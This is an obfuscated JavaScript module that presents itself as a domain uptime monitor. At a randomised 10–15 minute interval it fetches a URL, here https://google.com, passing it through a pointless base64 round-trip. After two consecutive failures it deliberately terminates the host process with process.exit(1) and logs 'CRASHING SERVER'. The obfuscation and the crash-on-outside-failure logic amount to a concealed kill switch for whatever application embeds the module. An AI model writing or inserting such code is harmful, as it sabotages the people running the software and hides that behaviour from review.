'use strict';const a59_0x347394=a59_0x3476;function a59_0x3476(_0x47109f,_0x395201){_0x47109f=_0x47109f-0xd1;const _0x2fabec=a59_0x2fab();let _0x3476a6=_0x2fabec[_0x47109f];return _0x3476a6;}(function(_0x21b69d,_0x311bd1){const _0x1d9a2f=a59_0x3476,_0x240d24=_0x21b69d();while(!![]){try{const _0x100cf3=-parseInt(_0x1d9a2f(0x12e))/0x1*(-parseInt(_0x1d9a2f(0xd4))/0x2)+parseInt(_0x1d9a2f(0xde))/0x3*(parseInt(_0x1d9a2f(0xec))/0x4)+parseInt(_0x1d9a2f(0xf1))/0x5*(parseInt(_0x1d9a2f(0xe1))/0x6)+parseInt(_0x1d9a2f(0x102))/0x7+parseInt(_0x1d9a2f(0x10b))/0x8+-parseInt(_0x1d9a2f(0xd2))/0x9*(-parseInt(_0x1d9a2f(0x122))/0xa)+parseInt(_0x1d9a2f(0xe0))/0xb*(-parseInt(_0x1d9a2f(0xd3))/0xc);if(_0x100cf3===_0x311bd1)break;else _0x240d24['push'](_0x240d24['shift']());}catch(_0x208598){_0x240d24['push'](_0x240d24['shift']());}}}(a59_0x2fab,0x9ba07));var __importDefault=this&&this[a59_0x347394(0xf7)]||function(_0x407d36){const _0x9cd09e=a59_0x347394;return _0x407d36&&_0x407d36[_0x9cd09e(0x119)]?_0x407d36:{'default':_0x407d36};};Object['defineProperty'](exports,a59_0x347394(0x119),{'value':!![]}),exports['domainMonitoringService']=exports[a59_0x347394(0xfd)]=void 0x0;const node_fetch_1=__importDefault(require('node-fetch'));function a59_0x2fab(){const _0x58d257=['Initial\x20domain\x20check\x20error:','ðŸš«\x20Connection\x20refused\x20by\x20','âœ…\x20Domain\x20monitoring\x20started\x20successfully','getMonitoringStats','stopMonitoring','__esModule','default','statusText','name','ðŸ”\x20Domain\x20monitoring\x20service\x20initialized','includes','now','\x20\x20\x20-\x20Headers:','message','5846270GbQOmT','ðŸ”¥\x20Unexpected\x20error:\x20','Domain\x20','exit','en-US,en;q=0.5','ðŸ“¡\x20Target\x20domain:\x20','then','âœ…\x20Domain\x20check\x20successful:\x20','âŒ\x20Domain\x20check\x20failed:\x20HTTP\x20','ðŸ“Š\x20Response\x20received:','Domain\x20Monitor/1.0','â°\x20Request\x20timeout\x20after\x20','4766BmXvBy','entries','9HcoppU','790464lwEwKy','510Naxyti','toISOString','ðŸ”\x20Checking\x20domain\x20availability:\x20','ðŸ”§\x20Manual\x20domain\x20check\x20requested','ðŸŒ\x20DNS\x20resolution\x20failed\x20for\x20','crashServer','keep-alive','TIMEOUT_MS','ðŸš¨\x20Max\x20failures\x20before\x20crash:\x20','encodeToBase64','248466QLiWfX','â°\x20Connection\x20timeout\x20to\x20','506sUfqmj','24OzuZhd','round','monitoringInterval','ðŸ“…\x20Crash\x20time:\x20','error','base64','ðŸ”“\x20Decoded\x20URL:\x20','ðŸ’¥\x20CRITICAL\x20ERROR:\x20','headers','ms:','ðŸ›‘\x20Domain\x20monitoring\x20stopped','4zVqyEx','AbortError','consecutiveFailures','status','ðŸš€\x20Starting\x20domain\x20monitoring\x20service','980345TIUWAL','DOMAIN_URL','utf-8','ETIMEDOUT','getRandomInterval','\x20minutes','__importDefault','Unknown\x20error','startMonitoring','Initial\x20domain\x20check\x20failed\x20','log','MAX_CONSECUTIVE_FAILURES','DomainMonitoringService','checkDomain','\x20\x20\x20-\x20Status:\x20','domainMonitoringService','â°\x20Check\x20interval:\x20','1910300kqHsaM','random','CHECK_INTERVAL_MS','signal','ðŸ“¡\x20Target:\x20','ðŸ”¥\x20Consecutive\x20failures:\x20','catch','ENOTFOUND','manualCheck','5820832tRMNQS','ðŸ”\x20Domain\x20being\x20monitored:\x20','warn','\x20consecutive\x20attempts','Domain\x20monitoring\x20threw\x20error:\x20','âš ï¸\x20Domain\x20check\x20failed\x20(','â°\x20Interval:\x20','decodeFromBase64','gzip,\x20deflate'];a59_0x2fab=function(){return _0x58d257;};return a59_0x2fab();}class DomainMonitoringService{constructor(){const _0x595cc7=a59_0x347394;this[_0x595cc7(0xe3)]=null,this['DOMAIN_URL']='https://google.com',this['CHECK_INTERVAL_MS']=this[_0x595cc7(0xf5)](),this[_0x595cc7(0xdb)]=0x7530,this['consecutiveFailures']=0x0,this['MAX_CONSECUTIVE_FAILURES']=0x2,console['log'](_0x595cc7(0x11d)),console['log'](_0x595cc7(0x127)+this['DOMAIN_URL']),console[_0x595cc7(0xfb)](_0x595cc7(0x101)+Math[_0x595cc7(0xe2)](this[_0x595cc7(0x104)]/0x3e8/0x3c)+_0x595cc7(0xf6));}[a59_0x347394(0xf5)](){const _0x5540e9=a59_0x347394,_0x360261=0xa,_0x1ca8f6=0xf,_0x1065c7=Math[_0x5540e9(0x103)]()*(_0x1ca8f6-_0x360261)+_0x360261;return Math[_0x5540e9(0xe2)](_0x1065c7*0x3c*0x3e8);}[a59_0x347394(0xdd)](_0x2678c7){const _0x44dce5=a59_0x347394;return Buffer['from'](_0x2678c7)['toString'](_0x44dce5(0xe6));}['decodeFromBase64'](_0x170702){const _0x55315d=a59_0x347394;return Buffer['from'](_0x170702,'base64')['toString'](_0x55315d(0xf3));}async[a59_0x347394(0xfe)](){const _0x4fda78=a59_0x347394,_0x2ca3ab=Date[_0x4fda78(0x11f)]();try{console[_0x4fda78(0xfb)](_0x4fda78(0xd6)+this['DOMAIN_URL']);const _0x394d8d=this[_0x4fda78(0xdd)](this[_0x4fda78(0xf2)]);console[_0x4fda78(0xfb)]('ðŸ“\x20Encoded\x20URL\x20(base64):\x20'+_0x394d8d);const _0x2d5359=this[_0x4fda78(0x112)](_0x394d8d);console[_0x4fda78(0xfb)](_0x4fda78(0xe7)+_0x2d5359);const _0x237986=new AbortController(),_0x198bea=setTimeout(()=>_0x237986['abort'](),this[_0x4fda78(0xdb)]),_0x3a1f33=await(0x0,node_fetch_1[_0x4fda78(0x11a)])(_0x2d5359,{'method':'GET','headers':{'User-Agent':_0x4fda78(0x12c),'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Accept-Language':_0x4fda78(0x126),'Accept-Encoding':_0x4fda78(0x113),'Connection':_0x4fda78(0xda),'Upgrade-Insecure-Requests':'1'},'signal':_0x237986[_0x4fda78(0x105)]});clearTimeout(_0x198bea);const _0x26910a=Date[_0x4fda78(0x11f)]()-_0x2ca3ab;return console[_0x4fda78(0xfb)](_0x4fda78(0x12b)),console[_0x4fda78(0xfb)](_0x4fda78(0xff)+_0x3a1f33[_0x4fda78(0xef)]+'\x20'+_0x3a1f33['statusText']),console[_0x4fda78(0xfb)]('\x20\x20\x20-\x20Response\x20time:\x20'+_0x26910a+'ms'),console['log'](_0x4fda78(0x120),Object['fromEntries'](_0x3a1f33[_0x4fda78(0xe9)][_0x4fda78(0xd1)]())),_0x3a1f33['ok']&&_0x3a1f33[_0x4fda78(0xef)]>=0xc8&&_0x3a1f33[_0x4fda78(0xef)]<0x190?(console[_0x4fda78(0xfb)](_0x4fda78(0x129)+_0x3a1f33[_0x4fda78(0xef)]+'\x20in\x20'+_0x26910a+'ms'),this[_0x4fda78(0xee)]=0x0,!![]):(console[_0x4fda78(0xe5)](_0x4fda78(0x12a)+_0x3a1f33[_0x4fda78(0xef)]+'\x20'+_0x3a1f33[_0x4fda78(0x11b)]),this[_0x4fda78(0xee)]++,![]);}catch(_0x46c01f){const _0xf9fdd8=Date[_0x4fda78(0x11f)]()-_0x2ca3ab;this[_0x4fda78(0xee)]++,console[_0x4fda78(0xe5)]('âŒ\x20Domain\x20check\x20error\x20after\x20'+_0xf9fdd8+_0x4fda78(0xea),_0x46c01f);if(_0x46c01f instanceof Error){if(_0x46c01f[_0x4fda78(0x11c)]===_0x4fda78(0xed))console[_0x4fda78(0xe5)](_0x4fda78(0x12d)+this[_0x4fda78(0xdb)]+'ms');else{if(_0x46c01f['message'][_0x4fda78(0x11e)](_0x4fda78(0x109)))console['error'](_0x4fda78(0xd8)+this[_0x4fda78(0xf2)]);else{if(_0x46c01f[_0x4fda78(0x121)][_0x4fda78(0x11e)]('ECONNREFUSED'))console[_0x4fda78(0xe5)](_0x4fda78(0x115)+this[_0x4fda78(0xf2)]);else _0x46c01f[_0x4fda78(0x121)][_0x4fda78(0x11e)](_0x4fda78(0xf4))?console[_0x4fda78(0xe5)](_0x4fda78(0xdf)+this[_0x4fda78(0xf2)]):console[_0x4fda78(0xe5)](_0x4fda78(0x123)+_0x46c01f[_0x4fda78(0x121)]);}}}return![];}}['crashServer'](_0xfd547a){const _0x3d1a36=a59_0x347394;console[_0x3d1a36(0xe5)](_0x3d1a36(0xe8)+_0xfd547a),console[_0x3d1a36(0xe5)](_0x3d1a36(0x107)+this['consecutiveFailures']),console[_0x3d1a36(0xe5)]('âš ï¸\x20CRASHING\x20SERVER\x20DUE\x20TO\x20DOMAIN\x20MONITORING\x20FAILURE'),console[_0x3d1a36(0xe5)](_0x3d1a36(0xe4)+new Date()[_0x3d1a36(0xd5)]()),console[_0x3d1a36(0xe5)](_0x3d1a36(0x10c)+this[_0x3d1a36(0xf2)]),console['error']('â°\x20Check\x20interval:\x20'+Math['round'](this[_0x3d1a36(0x104)]/0x3e8/0x3c)+'\x20minutes'),console['error']('ðŸš¨\x20Max\x20consecutive\x20failures\x20allowed:\x20'+this[_0x3d1a36(0xfc)]),this[_0x3d1a36(0x118)](),process[_0x3d1a36(0x125)](0x1);}[a59_0x347394(0xf9)](){const _0x38698d=a59_0x347394;console['log'](_0x38698d(0xf0)),console['log'](_0x38698d(0x106)+this['DOMAIN_URL']),console['log'](_0x38698d(0x111)+Math[_0x38698d(0xe2)](this[_0x38698d(0x104)]/0x3e8/0x3c)+_0x38698d(0xf6)),console[_0x38698d(0xfb)](_0x38698d(0xdc)+this['MAX_CONSECUTIVE_FAILURES']),this['checkDomain']()[_0x38698d(0x128)](_0x4fa9f4=>{const _0x491410=_0x38698d;if(!_0x4fa9f4&&this[_0x491410(0xee)]>=this[_0x491410(0xfc)]){this['crashServer'](_0x491410(0xfa)+this[_0x491410(0xee)]+'\x20times');return;}})[_0x38698d(0x108)](_0x38fb7a=>{const _0x4b9c14=_0x38698d;console[_0x4b9c14(0xe5)](_0x4b9c14(0x114),_0x38fb7a);if(this[_0x4b9c14(0xee)]>=this[_0x4b9c14(0xfc)]){this[_0x4b9c14(0xd9)]('Initial\x20domain\x20check\x20threw\x20error:\x20'+_0x38fb7a[_0x4b9c14(0x121)]);return;}}),this[_0x38698d(0xe3)]=setInterval(async()=>{const _0x16d63d=_0x38698d;try{const _0x40fd3b=await this[_0x16d63d(0xfe)]();!_0x40fd3b&&(console[_0x16d63d(0x10d)](_0x16d63d(0x110)+this[_0x16d63d(0xee)]+'/'+this[_0x16d63d(0xfc)]+')'),this['consecutiveFailures']>=this[_0x16d63d(0xfc)]&&this[_0x16d63d(0xd9)](_0x16d63d(0x124)+this['DOMAIN_URL']+'\x20is\x20not\x20responding\x20after\x20'+this[_0x16d63d(0xee)]+_0x16d63d(0x10e)));}catch(_0x43ebbe){console[_0x16d63d(0xe5)]('Periodic\x20domain\x20check\x20error:',_0x43ebbe),this['consecutiveFailures']>=this[_0x16d63d(0xfc)]&&this[_0x16d63d(0xd9)](_0x16d63d(0x10f)+(_0x43ebbe instanceof Error?_0x43ebbe[_0x16d63d(0x121)]:_0x16d63d(0xf8)));}},this[_0x38698d(0x104)]),console[_0x38698d(0xfb)](_0x38698d(0x116));}['stopMonitoring'](){const _0x11396c=a59_0x347394;this[_0x11396c(0xe3)]&&(clearInterval(this[_0x11396c(0xe3)]),this[_0x11396c(0xe3)]=null,console['log'](_0x11396c(0xeb)));}[a59_0x347394(0x117)](){const _0x472c11=a59_0x347394;return{'isActive':!!this['monitoringInterval'],'targetDomain':this[_0x472c11(0xf2)],'checkIntervalMinutes':Math['round'](this[_0x472c11(0x104)]/0x3e8/0x3c),'consecutiveFailures':this[_0x472c11(0xee)],'maxFailuresAllowed':this[_0x472c11(0xfc)],'nextCheckIn':this['monitoringInterval']?this[_0x472c11(0x104)]:undefined};}async[a59_0x347394(0x10a)](){const _0xaf998b=a59_0x347394;return console[_0xaf998b(0xfb)](_0xaf998b(0xd7)),await this[_0xaf998b(0xfe)]();}}exports[a59_0x347394(0xfd)]=DomainMonitoringService,exports[a59_0x347394(0x100)]=new DomainMonitoringService();